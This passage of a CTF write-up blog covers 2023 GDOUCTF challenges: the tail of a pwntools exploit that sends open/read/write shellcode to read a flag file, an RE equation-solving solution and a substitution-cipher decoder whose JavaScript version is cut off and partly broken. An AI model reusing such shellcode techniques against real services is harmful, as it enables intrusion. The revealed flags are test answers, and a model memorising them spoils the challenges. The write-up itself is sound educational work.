rsp'</span><span class="token punctuation">)</span>shpayload <span class="token operator">=</span> shellcraft<span class="token punctuation">.</span><span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">"./flag"</span><span class="token punctuation">)</span>shpayload <span class="token operator">+=</span> shellcraft<span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">,</span> <span class="token number">0x601080</span><span class="token punctuation">,</span> <span class="token number">0x50</span><span class="token punctuation">)</span>shpayload <span class="token operator">+=</span> shellcraft<span class="token punctuation">.</span>write<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0x601080</span><span class="token punctuation">,</span><span class="token number">0x50</span><span class="token punctuation">)</span>sla<span class="token punctuation">(</span><span class="token string">"num:"</span><span class="token punctuation">,</span><span class="token string">b'16'</span><span class="token punctuation">)</span>sla<span class="token punctuation">(</span><span class="token string">b'your door\n'</span><span class="token punctuation">,</span>payload<span class="token punctuation">)</span>sl<span class="token punctuation">(</span>asm<span class="token punctuation">(</span>shpayload<span class="token punctuation">)</span><span class="token punctuation">)</span>ia<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="/2023/04/16/2023-GDOUCTF/image-20230416222248511.png" alt="image-20230416222248511"></p><h1 id="RE"><a href="#RE" class="headerlink" title="RE"></a>RE</h1><h2 id="Check-Your-Luck"><a href="#Check-Your-Luck" class="headerlink" title="Check_Your_Luck"></a>Check_Your_Luck</h2><pre class="line-numbers language-C" data-language="C"><code class="language-C">#include &lt;iostream&gt;using namespace std;void flag_checker(int v, int w,int x,int y,int z); int main()&#123;int v,w,x,y,z;cout &lt;&lt; &quot;Input 5 random number and check your luck ;)&quot; &lt;&lt; endl;cout &lt;&lt; &quot;Num1: &quot;;cin &gt;&gt; v;cout &lt;&lt; &quot;Num2: &quot;;cin &gt;&gt; w;cout &lt;&lt; &quot;Num3: &quot;;cin &gt;&gt; x;cout &lt;&lt; &quot;Num4: &quot;;cin &gt;&gt; y;cout &lt;&lt; &quot;Num5: &quot;;cin &gt;&gt; z;cout &lt;&lt; endl;flag_checker(v,w,x,y,z);&#125;void flag_checker(int v,int w, int x, int y, int z)&#123;if ((v * 23 + w * -32 + x * 98 + y * 55 + z * 90 &#x3D;&#x3D; 333322) &amp;&amp;(v * 123 + w * -322 + x * 68 + y * 67 + z * 32 &#x3D;&#x3D; 707724) &amp;&amp;(v * 266 + w * -34 + x * 43 + y * 8 + z * 32 &#x3D;&#x3D; 1272529) &amp;&amp;(v * 343 + w * -352 + x * 58 + y * 65 + z * 5 &#x3D;&#x3D; 1672457) &amp;&amp;(v * 231 + w * -321 + x * 938 + y * 555 + z * 970 &#x3D;&#x3D; 3372367))&#123;cout &lt;&lt; &quot;Congratulations, Here is your flag:\n&quot;;cout &lt;&lt; &quot;flag&#123;&quot; &lt;&lt; v &lt;&lt; &quot;_&quot; &lt;&lt; w &lt;&lt; &quot;_&quot; &lt;&lt; x &lt;&lt; &quot;_&quot; &lt;&lt; y &lt;&lt; &quot;_&quot; &lt;&lt; z &lt;&lt; &quot;&#125;&quot; &lt;&lt; endl;&#125;else&#123;cout &lt;&lt; &quot;\nSeems your luck is not in favor right now!\nBetter luck next time!&quot; &lt;&lt; endl;&#125;&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>只需要解方程即可</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> sympyv<span class="token operator">=</span>sympy<span class="token punctuation">.</span>Symbol<span class="token punctuation">(</span><span class="token string">'v'</span><span class="token punctuation">)</span>w<span class="token operator">=</span>sympy<span class="token punctuation">.</span>Symbol<span class="token punctuation">(</span><span class="token string">'w'</span><span class="token punctuation">)</span>x<span class="token operator">=</span>sympy<span class="token punctuation">.</span>Symbol<span class="token punctuation">(</span><span class="token string">'x'</span><span class="token punctuation">)</span>y<span class="token operator">=</span>sympy<span class="token punctuation">.</span>Symbol<span class="token punctuation">(</span><span class="token string">'y'</span><span class="token punctuation">)</span>z<span class="token operator">=</span>sympy<span class="token punctuation">.</span>Symbol<span class="token punctuation">(</span><span class="token string">'z'</span><span class="token punctuation">)</span>f1<span class="token operator">=</span>v <span class="token operator">*</span> <span class="token number">23</span> <span class="token operator">+</span> w <span class="token operator">*</span> <span class="token operator">-</span><span class="token number">32</span> <span class="token operator">+</span> x <span class="token operator">*</span> <span class="token number">98</span> <span class="token operator">+</span> y <span class="token operator">*</span> <span class="token number">55</span> <span class="token operator">+</span> z <span class="token operator">*</span> <span class="token number">90</span> <span class="token operator">-</span> <span class="token number">333322</span>f2<span class="token operator">=</span>v <span class="token operator">*</span> <span class="token number">123</span> <span class="token operator">+</span> w <span class="token operator">*</span> <span class="token operator">-</span><span class="token number">322</span> <span class="token operator">+</span> x <span class="token operator">*</span> <span class="token number">68</span> <span class="token operator">+</span> y <span class="token operator">*</span> <span class="token number">67</span> <span class="token operator">+</span> z <span class="token operator">*</span> <span class="token number">32</span> <span class="token operator">-</span><span class="token number">707724</span>f3<span class="token operator">=</span>v <span class="token operator">*</span> <span class="token number">266</span> <span class="token operator">+</span> w <span class="token operator">*</span> <span class="token operator">-</span><span class="token number">34</span> <span class="token operator">+</span> x <span class="token operator">*</span> <span class="token number">43</span> <span class="token operator">+</span> y <span class="token operator">*</span> <span class="token number">8</span> <span class="token operator">+</span> z <span class="token operator">*</span> <span class="token number">32</span> <span class="token operator">-</span> <span class="token number">1272529</span>f4<span class="token operator">=</span>v <span class="token operator">*</span> <span class="token number">343</span> <span class="token operator">+</span> w <span class="token operator">*</span> <span class="token operator">-</span><span class="token number">352</span> <span class="token operator">+</span> x <span class="token operator">*</span> <span class="token number">58</span> <span class="token operator">+</span> y <span class="token operator">*</span> <span class="token number">65</span> <span class="token operator">+</span> z <span class="token operator">*</span> <span class="token number">5</span><span class="token operator">-</span> <span class="token number">1672457</span>f5<span class="token operator">=</span>v <span class="token operator">*</span> <span class="token number">231</span> <span class="token operator">+</span> w <span class="token operator">*</span> <span class="token operator">-</span><span class="token number">321</span> <span class="token operator">+</span> x <span class="token operator">*</span> <span class="token number">938</span> <span class="token operator">+</span> y <span class="token operator">*</span> <span class="token number">555</span> <span class="token operator">+</span> z <span class="token operator">*</span> <span class="token number">970</span><span class="token operator">-</span><span class="token number">3372367</span>r<span class="token operator">=</span>sympy<span class="token punctuation">.</span>solve<span class="token punctuation">(</span><span class="token punctuation">[</span>f1<span class="token punctuation">,</span>f2<span class="token punctuation">,</span>f3<span class="token punctuation">,</span>f4<span class="token punctuation">,</span>f5<span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token punctuation">[</span>v<span class="token punctuation">,</span>w<span class="token punctuation">,</span>x<span class="token punctuation">,</span>y<span class="token punctuation">,</span>z<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>r<span class="token punctuation">)</span><span class="token comment">#&#123;v: 4544, w: 123, x: 677, y: 1754, z: 777&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="/2023/04/16/2023-GDOUCTF/image-20230416220846361.png" alt="image-20230416220846361"></p><pre class="line-numbers language-none"><code class="language-none">flag&#123;4544_123_677_1754_777&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h1 id="Crypto"><a href="#Crypto" class="headerlink" title="Crypto"></a>Crypto</h1><h2 id="Absolute-Baby-Encrytpion"><a href="#Absolute-Baby-Encrytpion" class="headerlink" title="Absolute_Baby_Encrytpion"></a>Absolute_Baby_Encrytpion</h2><p>简单的替换加密，逆着回去就可以了。</p><p>python方法</p><pre class="line-numbers language-python" data-language="python"><code class="language-python">c<span class="token operator">=</span><span class="token string">'+&#125;!q")hiim)#&#125;-nvm)i-$#mvn#0mnbm)im#n+&#125;!qnm8)i-$#mvnoc#0nz&lt;$9inm!>-n1:1-nm8)i-$~c58n!&#125;qhij#0[noic##m8nc8n?!8c&#125;w!n]>&amp;'</span>encryptedString<span class="token operator">=</span><span class="token string">''</span><span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token builtin">len</span><span class="token punctuation">(</span>c<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">match</span> c<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">:</span>        <span class="token keyword">case</span> <span class="token string">'!'</span><span class="token punctuation">:</span>            encryptedString <span class="token operator">+=</span> <span class="token string">'a'</span>        <span class="token keyword">case</span> <span class="token string">'1'</span><span class="token punctuation">:</span>            encryptedString <span class="token operator">+=</span> <span class="token string">'b'</span>        <span class="token keyword">case</span> <span class="token string">')'</span><span class="token punctuation">:</span>            encryptedString <span class="token operator">+=</span> <span class="token string">'c'</span>        <span class="token keyword">case</span> <span class="token string">'v'</span><span class="token punctuation">:</span>            encryptedString <span class="token operator">+=</span> <span class="token string">'d'</span>        <span class="token keyword">case</span> <span class="token string">'m'</span><span class="token punctuation">:</span>            encryptedString <span class="token operator">+=</span> <span class="token string">'e'</span>        <span class="token keyword">case</span> <span class="token string">'+'</span><span class="token punctuation">:</span>            encryptedString <span class="token operator">+=</span> <span class="token string">'f'</span>        <span class="token keyword">case</span> <span class="token string">'q'</span><span class="token punctuation">:</span>            encryptedString <span class="token operator">+=</span> <span class="token string">'g'</span>        <span class="token keyword">case</span> <span class="token string">'0'</span><span class="token punctuation">:</span>            encryptedString <span class="token operator">+=</span> <span class="token string">'h'</span>        <span class="token keyword">case</span> <span class="token string">'c'</span><span class="token punctuation">:</span>            encryptedString <span class="token operator">+=</span> <span class="token string">'i'</span>        <span class="token keyword">case</span> <span class="token string">']'</span><span class="token punctuation">:</span>            encryptedString <span class="token operator">+=</span><span class="token string">'j'</span>        <span class="token keyword">case</span> <span class="token string">'('</span><span class="token punctuation">:</span>            encryptedString <span class="token operator">+=</span> <span class="token string">'k'</span>        <span class="token keyword">case</span> <span class="token string">'&#125;'</span><span class="token punctuation">:</span>            encryptedString <span class="token operator">+=</span> <span class="token string">'l'</span>        <span class="token keyword">case</span> <span class="token string">'['</span><span class="token punctuation">:</span>            encryptedString <span class="token operator">+=</span> <span class="token string">'m'</span>        <span class="token keyword">case</span> <span class="token string">'8'</span><span class="token punctuation">:</span>            encryptedString <span class="token operator">+=</span> <span class="token string">'n'</span>        <span class="token keyword">case</span> <span class="token string">'5'</span><span class="token punctuation">:</span>            encryptedString <span class="token operator">+=</span> <span class="token string">'o'</span>        <span class="token keyword">case</span> <span class="token string">'$'</span><span class="token punctuation">:</span>            encryptedString <span class="token operator">+=</span> <span class="token string">'p'</span>        <span class="token keyword">case</span> <span class="token string">'*'</span><span class="token punctuation">:</span>            encryptedString <span class="token operator">+=</span> <span class="token string">'q'</span>        <span class="token keyword">case</span> <span class="token string">'i'</span><span class="token punctuation">:</span>            encryptedString <span class="token operator">+=</span> <span class="token string">'r'</span>        <span class="token keyword">case</span> <span class="token string">'>'</span><span class="token punctuation">:</span>            encryptedString <span class="token operator">+=</span> <span class="token string">'s'</span>        <span class="token keyword">case</span> <span class="token string">'#'</span><span class="token punctuation">:</span>            encryptedString <span class="token operator">+=</span><span class="token string">'t'</span>        <span class="token keyword">case</span> <span class="token string">'&lt;'</span><span class="token punctuation">:</span>            encryptedString <span class="token operator">+=</span> <span class="token string">'u'</span>        <span class="token keyword">case</span> <span class="token string">'?'</span><span class="token punctuation">:</span>            encryptedString <span class="token operator">+=</span> <span class="token string">'v'</span>        <span class="token keyword">case</span> <span class="token string">'o'</span><span class="token punctuation">:</span>            encryptedString <span class="token operator">+=</span> <span class="token string">'w'</span>        <span class="token keyword">case</span> <span class="token string">'^'</span><span class="token punctuation">:</span>            encryptedString <span class="token operator">+=</span> <span class="token string">'x'</span>        <span class="token keyword">case</span> <span class="token string">'-'</span><span class="token punctuation">:</span>            encryptedString <span class="token operator">+=</span> <span class="token string">'y'</span>        <span class="token keyword">case</span> <span class="token string">'_'</span><span class="token punctuation">:</span>            encryptedString <span class="token operator">+=</span> <span class="token string">'z'</span>        <span class="token keyword">case</span> <span class="token string">'h'</span><span class="token punctuation">:</span>            encryptedString <span class="token operator">+=</span> <span class="token string">'0'</span>        <span class="token keyword">case</span> <span class="token string">'w'</span><span class="token punctuation">:</span>            encryptedString <span class="token operator">+=</span> <span class="token string">'1'</span>        <span class="token keyword">case</span> <span class="token string">'e'</span><span class="token punctuation">:</span>            encryptedString <span class="token operator">+=</span> <span class="token string">'2'</span>        <span class="token keyword">case</span> <span class="token string">'9'</span><span class="token punctuation">:</span>            encryptedString <span class="token operator">+=</span> <span class="token string">'3'</span>        <span class="token keyword">case</span> <span class="token string">'g'</span><span class="token punctuation">:</span>            encryptedString <span class="token operator">+=</span> <span class="token string">'4'</span>        <span class="token keyword">case</span> <span class="token string">'z'</span><span class="token punctuation">:</span>            encryptedString <span class="token operator">+=</span> <span class="token string">'5'</span>        <span class="token keyword">case</span> <span class="token string">'d'</span><span class="token punctuation">:</span>            encryptedString <span class="token operator">+=</span> <span class="token string">'6'</span>        <span class="token keyword">case</span> <span class="token string">'~'</span><span class="token punctuation">:</span>            encryptedString <span class="token operator">+=</span> <span class="token string">'7'</span>        <span class="token keyword">case</span> <span class="token string">'='</span><span class="token punctuation">:</span>            encryptedString <span class="token operator">+=</span> <span class="token string">'8'</span>        <span class="token keyword">case</span> <span class="token string">'x'</span><span class="token punctuation">:</span>            encryptedString <span class="token operator">+=</span> <span class="token string">'9'</span>        <span class="token keyword">case</span> <span class="token string">'j'</span><span class="token punctuation">:</span>            encryptedString <span class="token operator">+=</span> <span class="token string">'!'</span>        <span class="token keyword">case</span> <span class="token string">':'</span><span class="token punctuation">:</span>            encryptedString <span class="token operator">+=</span> <span class="token string">'@'</span>        <span class="token keyword">case</span> <span class="token string">'4'</span><span class="token punctuation">:</span>            encryptedString <span class="token operator">+=</span><span class="token string">'#'</span>        <span class="token keyword">case</span> <span class="token string">'b'</span><span class="token punctuation">:</span>            encryptedString <span class="token operator">+=</span> <span class="token string">'$'</span>        <span class="token keyword">case</span> <span class="token string">'`'</span><span class="token punctuation">:</span>            encryptedString <span class="token operator">+=</span> <span class="token string">'%'</span>        <span class="token keyword">case</span> <span class="token string">'l'</span><span class="token punctuation">:</span>            encryptedString <span class="token operator">+=</span> <span class="token string">'^'</span>        <span class="token keyword">case</span> <span class="token string">'3'</span><span class="token punctuation">:</span>            encryptedString <span class="token operator">+=</span> <span class="token string">'&amp;'</span>        <span class="token keyword">case</span> <span class="token string">'t'</span><span class="token punctuation">:</span>            encryptedString <span class="token operator">+=</span> <span class="token string">'*'</span>        <span class="token keyword">case</span> <span class="token string">'6'</span><span class="token punctuation">:</span>            encryptedString <span class="token operator">+=</span> <span class="token string">'('</span>        <span class="token keyword">case</span> <span class="token string">'s'</span><span class="token punctuation">:</span>            encryptedString <span class="token operator">+=</span> <span class="token string">')'</span>        <span class="token keyword">case</span> <span class="token string">'n'</span><span class="token punctuation">:</span>            encryptedString <span class="token operator">+=</span> <span class="token string">'_'</span>        <span class="token keyword">case</span> <span class="token string">';'</span><span class="token punctuation">:</span>            encryptedString <span class="token operator">+=</span> <span class="token string">'+'</span>        <span class="token keyword">case</span> <span class="token string">'\''</span><span class="token punctuation">:</span>            encryptedString <span class="token operator">+=</span> <span class="token string">'-'</span>        <span class="token keyword">case</span> <span class="token string">'r'</span><span class="token punctuation">:</span>            encryptedString <span class="token operator">+=</span> <span class="token string">'='</span>        <span class="token keyword">case</span> <span class="token string">'k'</span><span class="token punctuation">:</span>            encryptedString <span class="token operator">+=</span> <span class="token string">'`'</span>        <span class="token keyword">case</span> <span class="token string">'p'</span><span class="token punctuation">:</span>            encryptedString <span class="token operator">+=</span> <span class="token string">'~'</span>        <span class="token keyword">case</span> <span class="token string">'\"'</span><span class="token punctuation">:</span>            encryptedString <span class="token operator">+=</span> <span class="token string">'&#123;'</span>        <span class="token keyword">case</span> <span class="token string">'&amp;'</span><span class="token punctuation">:</span>            encryptedString <span class="token operator">+=</span> <span class="token string">'&#125;'</span>        <span class="token keyword">case</span> <span class="token string">'/'</span><span class="token punctuation">:</span>            encryptedString <span class="token operator">+=</span> <span class="token string">'['</span>        <span class="token keyword">case</span> <span class="token string">'\\'</span><span class="token punctuation">:</span>            encryptedString <span class="token operator">+=</span> <span class="token string">']'</span>        <span class="token keyword">case</span> <span class="token string">'2'</span><span class="token punctuation">:</span>            encryptedString <span class="token operator">+=</span> <span class="token string">'|'</span>        <span class="token keyword">case</span> <span class="token string">'.'</span><span class="token punctuation">:</span>            encryptedString <span class="token operator">+=</span> <span class="token string">':'</span>        <span class="token keyword">case</span> <span class="token string">'%'</span><span class="token punctuation">:</span>            encryptedString <span class="token operator">+=</span> <span class="token string">';'</span>        <span class="token keyword">case</span> <span class="token string">'|'</span><span class="token punctuation">:</span>            encryptedString <span class="token operator">+=</span> <span class="token string">'\"'</span>        <span class="token keyword">case</span> <span class="token string">','</span><span class="token punctuation">:</span>            encryptedString <span class="token operator">+=</span> <span class="token string">'\''</span>        <span class="token keyword">case</span> <span class="token string">'@'</span><span class="token punctuation">:</span>            encryptedString <span class="token operator">+=</span> <span class="token string">'&lt;'</span>        <span class="token keyword">case</span> <span class="token string">'&#125;'</span><span class="token punctuation">:</span>            encryptedString <span class="token operator">+=</span> <span class="token string">'>'</span>        <span class="token keyword">case</span> <span class="token string">'u'</span><span class="token punctuation">:</span>            encryptedString <span class="token operator">+=</span> <span class="token string">','</span>        <span class="token keyword">case</span> <span class="token string">'7'</span><span class="token punctuation">:</span>            encryptedString <span class="token operator">+=</span> <span class="token string">'.'</span>        <span class="token keyword">case</span> <span class="token string">'y'</span><span class="token punctuation">:</span>            encryptedString <span class="token operator">+=</span> <span class="token string">'?'</span>        <span class="token keyword">case</span> <span class="token string">'a'</span><span class="token punctuation">:</span>            encryptedString <span class="token operator">+=</span> <span class="token string">'/'</span><span class="token keyword">print</span><span class="token punctuation">(</span>encryptedString<span class="token punctuation">)</span><span class="token comment"># flag&#123;c0rrectly_decrypted_the_$ecret_flag_encrypted_with_5up3r_easy_b@by_encryp7ion_alg0r!thm_written_in_vanil1a_js&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>JS方法</p><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">let</span> encryptedString <span class="token operator">=</span> <span class="token string">'+&#125;!q")hiim)#&#125;-nvm)i-$#mvn#0mnbm)im#n+&#125;!qnm8)i-$#mvnoc#0nz&lt;$9inm!>-n1:1-nm8)i-$~c58n!&#125;qhij#0[noic##m8nc8n?!8c&#125;w!n]>&amp;'</span><span class="token punctuation">.</span><span class="token function">toLowerCase</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">let</span> encryptedString <span class="token operator">=</span> <span class="token string">""</span><span class="token punctuation">;</span><span class="token keyword">let</span> hasInvalidCharacter <span class="token operator">=</span> <span class="token boolean">false</span><span class="token punctuation">;</span><span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">let</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> charArray<span class="token punctuation">.</span>length<span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">switch</span> <span class="token punctuation">(</span>charArray<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">case</span> <span class="token string">'!'</span><span class="token operator">:</span>            encryptedString <span class="token operator">=</span> encryptedString<span class="token punctuation">.</span><span class="token function">concat</span><span class="token punctuation">(</span><span class="token string">'a'</span><span class="token punctuation">)</span>            <span class="token keyword">break</span><span class="token punctuation">;</span>        <span class="token keyword">case</span> <span class="token string">'1'</span><span class="token operator">:</span>            encryptedString <span class="token operator">=</span> encryptedString<span class="token punctuation">.</span><span class="token function">concat</span><span class="token punctuation">(</span><span class="token string">'b'</span><span class="token punctuation">)</span>            <span class="token keyword">break</span><span class="token punctuation">;</span>        <span class="token keyword">case</span> <span class="token string">')'</span><span class="token operator">:</span>            encryptedString <span class="token operator">=</span> encryptedString<span class="token punctuation">.</span><span class="token function">concat</span><span class="token punctuation">(</span><span class="token string">'c'</span><span class="token punctuation">)</span>            <span class="token keyword">break</span><span class="token punctuation">;</span>        <span class="token keyword">case</span> <span class="token string">'v'</span><span class="token operator">:</span>            encryptedString <span class="token operator">=</span> encryptedString<span class="token punctuation">.</span><span class="token function">concat</span><span class="token punctuation">(</span><span class="token string">'d'</span><span class="token punctuation">)</span>            <span class="token keyword">break</span><span class="token punctuation">;</span>        <span class="token keyword">case</span> <span class="token string">'m'</span><span class="token operator">:</span>            encryptedString <span class="token operator">=</span> encryptedString<span class="token punctuation">.</span><span class="token function">concat</span><span class="token punctuation">(</span><span class="token string">'e'</span><span class="token punctuation">)</span>            <span class="token keyword">break</span><span class="token punctuation">;</span>        <span class="token keyword">case</span> <span class="token string">'+'</span><span class="token operator">:</span>            encryptedString <span class="token operator">=</span> encryptedString<span class="token punctuation">.</span><span class="token function">concat</span><span class="token punctuation">(</span><span class="token string">'f'</span><span class="token punctuation">)</span>            <span class="token keyword">break</span><span class="token punctuation">;</span>        <span class="token keyword">case</span> <span class="token string">'q'</span><span class="token operator">:</span>            encryptedString <span class="token operator">=</span> encryptedString<span class="token punctuation">.</span><span class="token function">concat</span><span class="token punctuation">(</span><span class="token string">'g'</span><span class="token punctuation">)</span>            <span class="token keyword">break</span><span class="token punctuation">;</span>        <span class="token keyword">case</span> <span class="token string">'0'</span><span class="token operator">:</span>            encryptedString <span class="token operator">=</span> encryptedString<span class="token punctuation">.</span><span class="token function">concat</span><span class="token punctuation">(</span><span class="token string">'h'</span><span class="token punctuation">)</span>            <span class="token keyword">break</span><span class="token punctuation">;</span>        <span class="token keyword">case</span> <span class="token string">'c'</span><span class="token operator">:</span>            encryptedString <span class="token operator">=</span> encryptedString<span class="token punctuation">.</span><span class="token function">concat</span><span class="token punctuation">(</span><span class="token string">'i'</span><span class="token punctuation">)</span>            <span class="token keyword">break</span><span class="token punctuation">;</span>        <span class="token keyword">case</span> <span class="token string">']'</span><span class="token operator">:</span>            encryptedString <span class="token operator">=</span> encryptedString<span class="token punctuation">.</span><span class="token function">concat</span><span class="token punctuation">(</span><span class="token string">'j'</span><span class="token punctuation">)</span>            <span class="token keyword">break</span><span class="token punctuation">;</span>        <span class="token keyword">case</span> <span class="token string">'('</span><span class="token operator">:</span>            encryptedString <span class="token operator">=</span> encryptedString<span class="token punctuation">.</span><span class="token function">concat</span><span class="token punctuation">(</span><span class="token string">'k'</span><span class="token punctuation">)</span>            <span class="token keyword">break</span><span class="token punctuation">;</span>        <span class="token keyword">case</span> <span class="token string">'&#125;'</span><span class="token operator">:</span>            encryptedString <span class="token operator">=</span> encryptedString<span class="token punctuation">.</span><span class="token function">concat</span><span class="token punctuation">(</span><span class="token string">'l'</span><span class="token punctuation">)</span>            <span class="token keyword">break</span><span class="token punctuation">;</span>        <span class="token keyword">case</span> <span class="token string">'['</span><span class="token operator">:</span>            encryptedString <span class="token operator">=</span> encryptedString<span class="token punctuation">.</span><span class="token function">concat</span><span class="token punctuation">(</span><span class="token string">'m'</span><span class="token punctuation">)</span>            <span class="token keyword">break</span><span class="token punctuation">;</span>        <span class="token keyword">case</span> <span class="token string">'8'</span><span class="token operator">:</span>            encryptedString <span class="token operator">=</span> encryptedString<span class="token punctuation">.</span><span class="token function">concat</span><span class="token punctuation">(</span><span class="token string">'n'</span><span class="token punctuation">)</span>            <span class="token keyword">break</span><span class="token punctuation">;</span>        <span class="token keyword">case</span> <span class="token string">'5'</span><span class="token operator">:</span>            encryptedString <span class="token operator">=</span> encryptedString<span class="token punctuation">.</span><span class="token function">concat</span><span class="token punctuation">(</span><span class="token string">'o'</span><span class="token punctuation">)</span>            <span class="token keyword">break</span><span class="token punctuation">;</span>        <span class="token keyword">case</span> <span class="token string">'$'</span><span class="token operator">:</span>            encryptedString <span class="token operator">=</span> encryptedString<span class="token punctuation">.</span><span class="token function">concat</span><span class="token punctuation">(</span><span class="token string">'p'</span><span class="token punctuation">)</span>            <span class="token keyword">break</span><span class="token punctuation">;</span>        <span class="token keyword">case</span> <span class="token string">'*'</span><span class="token operator">:</span>            encryptedString <span class="token operator">=</span> encryptedString<span class="token punctuation">.</span><span class="token function">concat</span><span class="token punctuation">(</span><span class="token string">'q'</span><span class="token punctuation">)</span>            <span class="token keyword">break</span><span class="token punctuation">;</span>        <span class="token keyword">case</span> <span class="token string">'i'</span><span class="token operator">:</span>            encryptedString <span class="token operator">=</span> encryptedString<span class="token punctuation">.</span><span class="token function">concat</span><span class="token punctuation">(</span><span class="token string">'r'</span><span class="token punctuation">)</span>            <span class="token keyword">break</span><span class="token punctuation">;</span>        <span class="token keyword">case</span> <span class="token string">'>'</span><span class="token operator">:</span>            encryptedString <span class="token operator">=</span> encryptedString<span class="token punctuation">.</span><span class="token function">concat</span><span class="token punctuation">(</span><span class="token string">'s'</span><span class="token punctuation">)</span>            <span class="token keyword">break</span><span class="token punctuation">;</span>        <span class="token keyword">case</span> <span class="token string">'#'</span><span class="token operator">:</span>            encryptedString <span class="token operator">=</span> encryptedString<span class="token punctuation">.</span><span class="token function">concat</span><span class="token punctuation">(</span><span class="token string">'t'</span><span class="token punctuation">)</span>            <span class="token keyword">break</span><span class="token punctuation">;</span>        <span class="token keyword">case</span> <span class="token string">'&lt;'</span><span class="token operator">:</span>            encryptedString <span class="token operator">=</span> encryptedString<span class="token punctuation">.</span><span class="token function">concat</span><span class="token punctuation">(</span><span class="token string">'u'</span><span class="token punctuation">)</span>            <span class="token keyword">break</span><span class="token punctuation">;</span>        <span class="token keyword">case</span> <span class="token string">'?'</span><span class="token operator">:</span>            encryptedString <span class="token operator">=</span> encryptedString<span class="token punctuation">.</span><span class="token function">concat</span><span class="token punctuation">(</span><span class="token string">'v'</span><span class="token punctuation">)</span>            <span class="token keyword">break</span><span class="token punctuation">;</span>        <span class="token keyword">case</span> <span class="token string">'o'</span><span class="token operator">:</span>            encryptedString <span class="token operator">=</span> encryptedString<span class="token punctuation">.</span><span class="token function">concat</span><span class="token punctuation">(</span><span class="token string">'w'</span><span class="token punctuation">)</span>            <span class="token keyword">break</span><span class="token punctuation">;</span>        <span class="token keyword">case</span> <span class="token string">'^'</span><span class="token operator">:</span>            encryptedString <span class="token operator">=</span> encryptedString<span class="token punctuation">.</span><span class="token function">concat</span><span class="token punctuation">(</span><span class="token string">'x'</span><span class="token punctuation">)</span>            <span class="token keyword">break</span><span class="token punctuation">;</span>        <span class="token keyword">case</span> <span class="token string">'-'</span><span class="token operator">:</span>            encryptedString <span class="token operator">=</span> encryptedString<span class="token punctuation">.</span><span class="token function">concat</span><span class="token punctuation">(</span><span class="token string">'y'</span><span class="token punctuation">)</span>            <span class="token keyword">break</span><span class="token punctuation">;</span>        <span class="token keyword">case</span> <span class="token string">'_'</span><span class="token operator">:</span>            encryptedString <span class="token operator">=</span> encryptedString<span class="token punctuation">.</span><span class="token function">concat</span><span class="token punctuation">(</span><span class="token string">'z'</span><span class="token punctuation">)</span>            <span class="token keyword">break</span><span class="token punctuation">;</span>        <span class="token keyword">case</span> <span class="token string">'h'</span><span class="token 